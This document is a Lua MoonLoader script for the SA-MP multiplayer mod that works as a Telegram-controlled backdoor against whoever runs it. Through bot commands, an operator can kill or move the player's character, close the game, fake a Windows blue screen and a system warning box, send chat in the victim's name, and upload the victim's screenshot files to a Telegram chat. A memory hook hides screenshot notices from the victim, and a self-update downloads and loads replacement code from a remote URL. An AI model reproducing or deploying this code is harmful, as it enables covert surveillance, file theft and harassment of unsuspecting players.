require "lib.moonloader"
local dlstatus = require('moonloader').download_status
local effil = require("effil")
local inicfg = require 'inicfg'
local keys = require "vkeys"
local encoding = require 'encoding'
encoding.default = 'CP1251'
u8 = encoding.UTF8
local ffi = require 'ffi'
local hook = {hooks = {}}
addEventHandler('onScriptTerminate', function(scr)
    if scr == script.this then
        for i, hook in ipairs(hook.hooks) do
            if hook.status then
                hook.stop()
            end
        end
    end
end)

ffi.cdef [[
    int VirtualProtect(void* lpAddress, unsigned long dwSize, unsigned long flNewProtect, unsigned long* lpflOldProtect);
]]

--bluescreen
local bluescreen = false
local userList = 'Available users:'

local font_flag = require('moonloader').font_flag
local font1 = renderCreateFont('Arial', 150, 0)
local font2 = renderCreateFont('Arial', 30, 0)
local font3 = renderCreateFont('Arial', 15, 0)

--autoupd
update_state = false

local script_vers = 1
local script_vers_text = '1.00'

local update_url = 'ссылка'
local update_path = getWorkingDirectory() .. '/update.ini'

local script_url = 'ссылка'
local script_path = thisScript().path

--tg
local Telegram = require('MoonGram')

chat_id = 'чат ид'
token = 'токен' 

local updateid

function main()
    while not isSampAvailable() do wait(0) end

    sampChatHook = hook.new('void(__thiscall *)(void *this, uint32_t type, const char* text, const char* prefix, uint32_t color, uint32_t pcolor)', ChatHook, getModuleHandle('samp.dll') + 0x64010)

	_, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
    nick = sampGetPlayerNickname(id)

    downloadUrlToFile(update_url, update_path, function(id, status)
        if status == dlstatus.STATUS_ENDDOWNLOADDATA then
            updateIni = inicfg.load(nil, update_path)
            if tonumber(updateIni.info.vers) > script_vers then
                update_state = true
            end
            os.remove(update_path)
        end
    end)

    getLastUpdate()
    
    lua_thread.create(get_telegram_updates)

    wait(1000)
    
    while true do
        wait(0)
        _, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
        nick = sampGetPlayerNickname(id)
        wait(1500)
        

        if update_state then
            downloadUrlToFile(script_url, script_path, function(id, status)
                if status == dlstatus.STATUS_ENDDOWNLOADDATA then
                    thisScript():reload()
                end
            end)
            break
        end

    end
end

function hook.new(cast, callback, hook_addr, size)
    local size = size or 5
    local new_hook = {}
    local detour_addr = tonumber(ffi.cast('intptr_t', ffi.cast('void*', ffi.cast(cast, callback))))
    local void_addr = ffi.cast('void*', hook_addr)
    local old_prot = ffi.new('unsigned long[1]')
    local org_bytes = ffi.new('uint8_t[?]', size)
    ffi.copy(org_bytes, void_addr, size)
    local hook_bytes = ffi.new('uint8_t[?]', size, 0x90)
    hook_bytes[0] = 0xE9
    ffi.cast('uint32_t*', hook_bytes + 1)[0] = detour_addr - hook_addr - 5
    new_hook.call = ffi.cast(cast, hook_addr)
    new_hook.status = false
    local function set_status(bool)
        new_hook.status = bool
        ffi.C.VirtualProtect(void_addr, size, 0x40, old_prot)
        ffi.copy(void_addr, bool and hook_bytes or org_bytes, size)
        ffi.C.VirtualProtect(void_addr, size, old_prot[0], old_prot)
    end
    new_hook.stop = function() set_status(false) end
    new_hook.start = function() set_status(true) end
    new_hook.start()
    table.insert(hook.hooks, new_hook)
    return setmetatable(new_hook, {
        __call = function(self, ...)
            self.stop()
            local res = self.call(...)
            self.start()
            return res
        end
    })
end

function ChatHook(HOOKED_CHAT_THIS, HOOKED_CHAT_TYPE, HOOKED_CHAT_TEXT, HOOKED_CHAT_PREFIX, HOOKED_CHAT_COLOR, HOOKED_CHAT_PCOLOR)
    local text = ffi.string(HOOKED_CHAT_TEXT)

    if text:find('Screenshot Taken (-) sa(-)mp(-)%d+.png') then
        idscreen1, idscreen2, idscreen3, idscreen4 = text:match('Screenshot Taken (-) sa(-)mp(-)(%d+).png')
        sendTelegramNotification('Сделан скриншот: sa-mp-'..idscreen4..'.png')
        return
    end
    sampChatHook(HOOKED_CHAT_THIS, HOOKED_CHAT_TYPE, HOOKED_CHAT_TEXT, HOOKED_CHAT_PREFIX, HOOKED_CHAT_COLOR, HOOKED_CHAT_PCOLOR)
end

function sampTakeScreenshot()
    ffi.cast('void (__cdecl *)(void)', getModuleHandle("samp.dll") + 0x70FC0)( )
end

function onD3DPresent()
    if bluescreen then
        local copywrite = {
            [4] = ':(',
            [5] = 'На вашем ПК возникла проблема, и его необходимо \nперезагрузить. Мы лишь собираем некоторые сведения об \nошибке, а затем будет автоматическая \nперезагрузка (выполнено 100%)',
            [6] = 'Дополнительные сведения об этой проблеме и возможных способах ее решения см. в Интернете по коду ошибки: SYSTEM_TRIED_TO_DELETE'
        }
        lua_thread.create(function() 
            while true do
                wait(0)
                resX, resY = getScreenResolution()
                renderDrawBox(0, 0, resX, resY, 0xFF0191ea)
                renderFontDrawText(font1, copywrite[4], 150, 150, 0xFFFFFFFF)
                renderFontDrawText(font2, copywrite[5], 150, 600, 0xFFFFFFFF)
                renderFontDrawText(font3, copywrite[6], 150, 900, 0xFFFFFFFF)
            end
        end)
    end
end

function ShowMessage(text, title, style)
    ffi.cdef [[
        int MessageBoxA(
            void* hWnd,
            const char* lpText,
            const char* lpCaption,
            unsigned int uType
        );
    ]]
    local hwnd = ffi.cast('void*', readMemory(0x00C8CF88, 4, false))
    ffi.C.MessageBoxA(hwnd, text,  title, style and (style + 0x50000) or 0x50000)
end

--tg
function threadHandle(runner, url, args, resolve, reject)
    local t = runner(url, args)
    local r = t:get(0)
    while not r do
        r = t:get(0)
        wait(0)
    end
    local status = t:status()
    if status == 'completed' then
        local ok, result = r[1], r[2]
        if ok then resolve(result) else reject(result) end
    elseif err then
        reject(err)
    elseif status == 'canceled' then
        reject(status)
    end
    t:cancel(0)
end

function requestRunner()
    return effil.thread(function(u, a)
        local https = require 'ssl.https'
        local ok, result = pcall(https.request, u, a)
        if ok then
            return {true, result}
        else
            return {false, result}
        end
    end)
end

function async_http_request(url, args, resolve, reject)
    local runner = requestRunner()
    if not reject then reject = function() end end
    lua_thread.create(function()
        threadHandle(runner, url, args, resolve, reject)
    end)
end

function encodeUrl(str)
    str = str:gsub(' ', '%+')
    str = str:gsub('\n', '%%0A')
    return u8:encode(str, 'CP1251')
end

function sendTelegramNotification(msg) 
    msg = msg:gsub('{......}', '') 
    msg = encodeUrl(msg) 
    async_http_request('https://api.telegram.org/bot' .. token .. '/sendMessage?chat_id=' .. chat_id .. '&text='..msg,'', function(result) end) 
end

function get_telegram_updates() 
    while not updateid do wait(1) end 
    local runner = requestRunner()
    local reject = function() end
    local args = ''
    while true do
        url = 'https://api.telegram.org/bot'..token..'/getUpdates?chat_id='..chat_id..'&offset=-1' 
        threadHandle(runner, url, args, processing_telegram_messages, reject)
        wait(0)
    end
end

function processing_telegram_messages(result)
    local id = select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))
    local name = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))
    local telegram = Telegram:new('токен')
    if result then
        local proc_table = decodeJson(result)
        if proc_table.ok then
            if #proc_table.result > 0 then
                local res_table = proc_table.result[1]
                if res_table then
                    if res_table.update_id ~= updateid then
                        updateid = res_table.update_id
                        local message_from_user = res_table.message.text
                        if message_from_user then
                            
                            local text = u8:decode(message_from_user) .. ' ' 
                            if text:match('^/cmd') then
                                sendTelegramNotification('Команды:%0A%0A/up+ - слап вверх%0A/up- - слап вниз%0A/cage - закинуть в клетку%0A/shakecam - тряска экрана%0A/killuser - сетхп0%0A/quitgame - закрыть игру%0A/online - онлайн со скриптом%0A/screengame - выгрузить скриншот из папки с игрой(пример: /screengame 001.png)%0A/f8screen - сделать ф8скрин%0A/bluescreen - синий экран%0A/schat - написать в невизуал чат%0A/specon - включить режим спека%0A/specoff - выключить режим спека%0A/messagebox - открыть окно с сообщением')
                            elseif text:match('^/up+') then
                                x, y, z = getCharCoordinates(PLAYER_PED)
                                setCharCoordinates(PLAYER_PED, x, y, z + 3)
                                sendTelegramNotification('Слап+')
                            elseif text:match('^/up-') then
                                x, y, z = getCharCoordinates(PLAYER_PED)
                                setCharCoordinates(PLAYER_PED, x, y, z - 3)
                                sendTelegramNotification('Слап-')
                            elseif text:match('^/cage') then
                                x, y, z = getCharCoordinates(PLAYER_PED)
                                cage = createObject(18856, x, y , z - 1)
                                sendTelegramNotification('В клетке')
                            elseif text:match('^/shakecam') then
                                shakeCam(10000)
                                sendTelegramNotification('Шейк-камеры')
                            elseif text:match('^/killuser') then
                                setCharHealth(PLAYER_PED, 0)
                                sendTelegramNotification('Установлено 0 хп')
                            elseif text:match('^/quitgame') then
                                sendTelegramNotification('Игра закрыта')
                                callFunction(sampGetBase() + 0x64D70, 0, 0)
                            elseif text:match('^/online') then
                                sendTelegramNotification('В онлайне: '..name)
                            elseif text:match('^/screengame') then
                                local argument = text:gsub('/screengame ','',1)
                                lua_thread.create(function ()
                                    local result, response = telegram:sendPhoto(
                                        1782097567, 
                                        string.format('%s\\GTA San Andreas User Files\\SAMP\\screens\\sa-mp-%s', getFolderPath(5), tostring(argument)) --sa-mp-000.png
                                    )
                                end)
                            elseif text:match('^/schat') then
                                local arg = text:gsub('/schat ','',1)
                                sampSendChat(arg)
                                sendTelegramNotification('Сообщение отправлено(не визуал) юзерам: '..name)
                            elseif text:match('^/bluescreen') then
                                lua_thread.create(function() 
                                    bluescreen = true
                                    wait(5000)
                                    bluescreen = false
                                end)
                                sendTelegramNotification('Синий экран включен')
                            elseif text:match('^/f8screen') then
                                sampTakeScreenshot()
                                sendTelegramNotification('Скриншот сделан')
                            elseif text:match('^/messagebox') then
                                local msgbox_text = text:gsub('/messagebox ','',1)
                                ShowMessage(msgbox_text, 'System Warning', 0x10)
                                sendTelegramNotification('М-Бокс отправлен с текстом: '..msgbox_text)
                            elseif text:match('^/specon') then
                                emul_rpc('onTogglePlayerSpectating', {true})
                                sendTelegramNotification('Режим спека включен')
                            elseif text:match('^/specoff') then
                                emul_rpc('onTogglePlayerSpectating', {false})
                                sendTelegramNotification('Режим спека выключен')
                            else 
                                sendTelegramNotification('Неизвестная команда!')
                            end
                        end
                    end
                end
            end
        end
    end
end

function getLastUpdate() 
    async_http_request('https://api.telegram.org/bot'..token..'/getUpdates?chat_id='..chat_id..'&offset=-1','',function(result)
        if result then
            local proc_table = decodeJson(result)
            if proc_table.ok then
                if #proc_table.result > 0 then
                    local res_table = proc_table.result[1]
                    if res_table then
                        updateid = res_table.update_id
                    end
                else
                    updateid = 1 
                end
            end
        end
    end)
end

function emul_rpc(hook, parameters)
    local bs_io = require 'samp.events.bitstream_io'
    local handler = require 'samp.events.handlers'
    local extra_types = require 'samp.events.extra_types'
    local hooks = {

        --[[ Outgoing rpcs
        ['onSendEnterVehicle'] = { 'int16', 'bool8', 26 },
        ['onSendClickPlayer'] = { 'int16', 'int8', 23 },
        ['onSendClientJoin'] = { 'int32', 'int8', 'string8', 'int32', 'string8', 'string8', 'int32', 25 },
        ['onSendEnterEditObject'] = { 'int32', 'int16', 'int32', 'vector3d', 27 },
        ['onSendCommand'] = { 'string32', 50 },
        ['onSendSpawn'] = { 52 },
        ['onSendDeathNotification'] = { 'int8', 'int16', 53 },
        ['onSendDialogResponse'] = { 'int16', 'int8', 'int16', 'string8', 62 },
        ['onSendClickTextDraw'] = { 'int16', 83 },
        ['onSendVehicleTuningNotification'] = { 'int32', 'int32', 'int32', 'int32', 96 },
        ['onSendChat'] = { 'string8', 101 },
        ['onSendClientCheckResponse'] = { 'int8', 'int32', 'int8', 103 },
        ['onSendVehicleDamaged'] = { 'int16', 'int32', 'int32', 'int8', 'int8', 106 },
        ['onSendEditAttachedObject'] = { 'int32', 'int32', 'int32', 'int32', 'vector3d', 'vector3d', 'vector3d', 'int32', 'int32', 116 },
        ['onSendEditObject'] = { 'bool', 'int16', 'int32', 'vector3d', 'vector3d', 117 },
        ['onSendInteriorChangeNotification'] = { 'int8', 118 },
        ['onSendMapMarker'] = { 'vector3d', 119 },
        ['onSendRequestClass'] = { 'int32', 128 },
        ['onSendRequestSpawn'] = { 129 },
        ['onSendPickedUpPickup'] = { 'int32', 131 },
        ['onSendMenuSelect'] = { 'int8', 132 },
        ['onSendVehicleDestroyed'] = { 'int16', 136 },
        ['onSendQuitMenu'] = { 140 },
        ['onSendExitVehicle'] = { 'int16', 154 },
        ['onSendUpdateScoresAndPings'] = { 155 },
        ['onSendGiveDamage'] = { 'int16', 'float', 'int32', 'int32', 115 },
        ['onSendTakeDamage'] = { 'int16', 'float', 'int32', 'int32', 115 },]]

        -- Incoming rpcs
        ['onInitGame'] = { 139 },
        ['onPlayerJoin'] = { 'int16', 'int32', 'bool8', 'string8', 137 },
        ['onPlayerQuit'] = { 'int16', 'int8', 138 },
        ['onRequestClassResponse'] = { 'bool8', 'int8', 'int32', 'int8', 'vector3d', 'float', 'Int32Array3', 'Int32Array3', 128 },
        ['onRequestSpawnResponse'] = { 'bool8', 129 },
        ['onSetPlayerName'] = { 'int16', 'string8', 'bool8', 11 },
        ['onSetPlayerPos'] = { 'vector3d', 12 },
        ['onSetPlayerPosFindZ'] = { 'vector3d', 13 },
        ['onSetPlayerHealth'] = { 'float', 14 },
        ['onTogglePlayerControllable'] = { 'bool8', 15 },
        ['onPlaySound'] = { 'int32', 'vector3d', 16 },
        ['onSetWorldBounds'] = { 'float', 'float', 'float', 'float', 17 },
        ['onGivePlayerMoney'] = { 'int32', 18 },
        ['onSetPlayerFacingAngle'] = { 'float', 19 },
        --['onResetPlayerMoney'] = { 20 },
        --['onResetPlayerWeapons'] = { 21 },
        ['onGivePlayerWeapon'] = { 'int32', 'int32', 22 },
        --['onCancelEdit'] = { 28 },
        ['onSetPlayerTime'] = { 'int8', 'int8', 29 },
        ['onSetToggleClock'] = { 'bool8', 30 },
        ['onPlayerStreamIn'] = { 'int16', 'int8', 'int32', 'vector3d', 'float', 'int32', 'int8', 32 },
        ['onSetShopName'] = { 'string256', 33 },
        ['onSetPlayerSkillLevel'] = { 'int16', 'int32', 'int16', 34 },
        ['onSetPlayerDrunk'] = { 'int32', 35 },
        ['onCreate3DText'] = { 'int16', 'int32', 'vector3d', 'float', 'bool8', 'int16', 'int16', 'encodedString4096', 36 },
        --['onDisableCheckpoint'] = { 37 },
        ['onSetRaceCheckpoint'] = { 'int8', 'vector3d', 'vector3d', 'float', 38 },
        --['onDisableRaceCheckpoint'] = { 39 },
        --['onGamemodeRestart'] = { 40 },
        ['onPlayAudioStream'] = { 'string8', 'vector3d', 'float', 'bool8', 41 },
        --['onStopAudioStream'] = { 42 },
        ['onRemoveBuilding'] = { 'int32', 'vector3d', 'float', 43 },
        ['onCreateObject'] = { 44 },
        ['onSetObjectPosition'] = { 'int16', 'vector3d', 45 },
        ['onSetObjectRotation'] = { 'int16', 'vector3d', 46 },
        ['onDestroyObject'] = { 'int16', 47 },
        ['onPlayerDeathNotification'] = { 'int16', 'int16', 'int8', 55 },
        ['onSetMapIcon'] = { 'int8', 'vector3d', 'int8', 'int32', 'int8', 56 },
        ['onRemoveVehicleComponent'] = { 'int16', 'int16', 57 },
        ['onRemove3DTextLabel'] = { 'int16', 58 },
        ['onPlayerChatBubble'] = { 'int16', 'int32', 'float', 'int32', 'string8', 59 },
        ['onUpdateGlobalTimer'] = { 'int32', 60 },
        ['onShowDialog'] = { 'int16', 'int8', 'string8', 'string8', 'string8', 'encodedString4096', 61 },
        ['onDestroyPickup'] = { 'int32', 63 },
        ['onLinkVehicleToInterior'] = { 'int16', 'int8', 65 },
        ['onSetPlayerArmour'] = { 'float', 66 },
        ['onSetPlayerArmedWeapon'] = { 'int32', 67 },
        ['onSetSpawnInfo'] = { 'int8', 'int32', 'int8', 'vector3d', 'float', 'Int32Array3', 'Int32Array3', 68 },
        ['onSetPlayerTeam'] = { 'int16', 'int8', 69 },
        ['onPutPlayerInVehicle'] = { 'int16', 'int8', 70 },
        --['onRemovePlayerFromVehicle'] = { 71 },
        ['onSetPlayerColor'] = { 'int16', 'int32', 72 },
        ['onDisplayGameText'] = { 'int32', 'int32', 'string32', 73 },
        --['onForceClassSelection'] = { 74 },
        ['onAttachObjectToPlayer'] = { 'int16', 'int16', 'vector3d', 'vector3d', 75 },
        ['onInitMenu'] = { 76 },
        ['onShowMenu'] = { 'int8', 77 },
        ['onHideMenu'] = { 'int8', 78 },
        ['onCreateExplosion'] = { 'vector3d', 'int32', 'float', 79 },
        ['onShowPlayerNameTag'] = { 'int16', 'bool8', 80 },
        ['onAttachCameraToObject'] = { 'int16', 81 },
        ['onInterpolateCamera'] = { 'bool', 'vector3d', 'vector3d', 'int32', 'int8', 82 },
        ['onGangZoneStopFlash'] = { 'int16', 85 },
        ['onApplyPlayerAnimation'] = { 'int16', 'string8', 'string8', 'bool', 'bool', 'bool', 'bool', 'int32', 86 },
        ['onClearPlayerAnimation'] = { 'int16', 87 },
        ['onSetPlayerSpecialAction'] = { 'int8', 88 },
        ['onSetPlayerFightingStyle'] = { 'int16', 'int8', 89 },
        ['onSetPlayerVelocity'] = { 'vector3d', 90 },
        ['onSetVehicleVelocity'] = { 'bool8', 'vector3d', 91 },
        ['onServerMessage'] = { 'int32', 'string32', 93 },
        ['onSetWorldTime'] = { 'int8', 94 },
        ['onCreatePickup'] = { 'int32', 'int32', 'int32', 'vector3d', 95 },
        ['onMoveObject'] = { 'int16', 'vector3d', 'vector3d', 'float', 'vector3d', 99 },
        ['onEnableStuntBonus'] = { 'bool', 104 },
        ['onTextDrawSetString'] = { 'int16', 'string16', 105 },
        ['onSetCheckpoint'] = { 'vector3d', 'float', 107 },
        ['onCreateGangZone'] = { 'int16', 'vector2d', 'vector2d', 'int32', 108 },
        ['onPlayCrimeReport'] = { 'int16', 'int32', 'int32', 'int32', 'int32', 'vector3d', 112 },
        ['onGangZoneDestroy'] = { 'int16', 120 },
        ['onGangZoneFlash'] = { 'int16', 'int32', 121 },
        ['onStopObject'] = { 'int16', 122 },
        ['onSetVehicleNumberPlate'] = { 'int16', 'string8', 123 },
        ['onTogglePlayerSpectating'] = { 'bool32', 124 },
        ['onSpectatePlayer'] = { 'int16', 'int8', 126 },
        ['onSpectateVehicle'] = { 'int16', 'int8', 127 },
        ['onShowTextDraw'] = { 134 },
        ['onSetPlayerWantedLevel'] = { 'int8', 133 },
        ['onTextDrawHide'] = { 'int16', 135 },
        ['onRemoveMapIcon'] = { 'int8', 144 },
        ['onSetWeaponAmmo'] = { 'int8', 'int16', 145 },
        ['onSetGravity'] = { 'float', 146 },
        ['onSetVehicleHealth'] = { 'int16', 'float', 147 },
        ['onAttachTrailerToVehicle'] = { 'int16', 'int16', 148 },
        ['onDetachTrailerFromVehicle'] = { 'int16', 149 },
        ['onSetWeather'] = { 'int8', 152 },
        ['onSetPlayerSkin'] = { 'int32', 'int32', 153 },
        ['onSetInterior'] = { 'int8', 156 },
        ['onSetCameraPosition'] = { 'vector3d', 157 },
        ['onSetCameraLookAt'] = { 'vector3d', 'int8', 158 },
        ['onSetVehiclePosition'] = { 'int16', 'vector3d', 159 },
        ['onSetVehicleAngle'] = { 'int16', 'float', 160 },
        ['onSetVehicleParams'] = { 'int16', 'int16', 'bool8', 161 },
        --['onSetCameraBehind'] = { 162 },
        ['onChatMessage'] = { 'int16', 'string8', 101 },
        ['onConnectionRejected'] = { 'int8', 130 },
        ['onPlayerStreamOut'] = { 'int16', 163 },
        ['onVehicleStreamIn'] = { 164 },
        ['onVehicleStreamOut'] = { 'int16', 165 },
        ['onPlayerDeath'] = { 'int16', 166 },
        ['onPlayerEnterVehicle'] = { 'int16', 'int16', 'bool8', 26 },
        ['onUpdateScoresAndPings'] = { 'PlayerScorePingMap', 155 },
        ['onSetObjectMaterial'] = { 84 },
        ['onSetObjectMaterialText'] = { 84 },
        ['onSetVehicleParamsEx'] = { 'int16', 'int8', 'int8', 'int8', 'int8', 'int8', 'int8', 'int8', 'int8', 'int8', 'int8', 'int8', 'int8', 'int8', 'int8', 'int8', 'int8', 24 },
        ['onSetPlayerAttachedObject'] = { 'int16', 'int32', 'bool', 'int32', 'int32', 'vector3d', 'vector3d', 'vector3d', 'int32', 'int32', 113 }

    }
    local handler_hook = {
        ['onInitGame'] = true,
        ['onCreateObject'] = true,
        ['onInitMenu'] = true,
        ['onShowTextDraw'] = true,
        ['onVehicleStreamIn'] = true,
        ['onSetObjectMaterial'] = true,
        ['onSetObjectMaterialText'] = true
    }
    local extra = {
        ['PlayerScorePingMap'] = true,
        ['Int32Array3'] = true
    }
    local hook_table = hooks[hook]
    if hook_table then
        local bs = raknetNewBitStream()
        if not handler_hook[hook] then
            local max = #hook_table-1
            if max > 0 then
                for i = 1, max do
                    local p = hook_table[i]
                    if extra[p] then extra_types[p]['write'](bs, parameters[i])
                    else bs_io[p]['write'](bs, parameters[i]) end
                end
            end
        else
            if hook == 'onInitGame' then handler.on_init_game_writer(bs, parameters)
            elseif hook == 'onCreateObject' then handler.on_create_object_writer(bs, parameters)
            elseif hook == 'onInitMenu' then handler.on_init_menu_writer(bs, parameters)
            elseif hook == 'onShowTextDraw' then handler.on_show_textdraw_writer(bs, parameters)
            elseif hook == 'onVehicleStreamIn' then handler.on_vehicle_stream_in_writer(bs, parameters)
            elseif hook == 'onSetObjectMaterial' then handler.on_set_object_material_writer(bs, parameters, 1)
            elseif hook == 'onSetObjectMaterialText' then handler.on_set_object_material_writer(bs, parameters, 2) end
        end
        raknetEmulRpcReceiveBitStream(hook_table[#hook_table], bs)
        raknetDeleteBitStream(bs)
    end
end
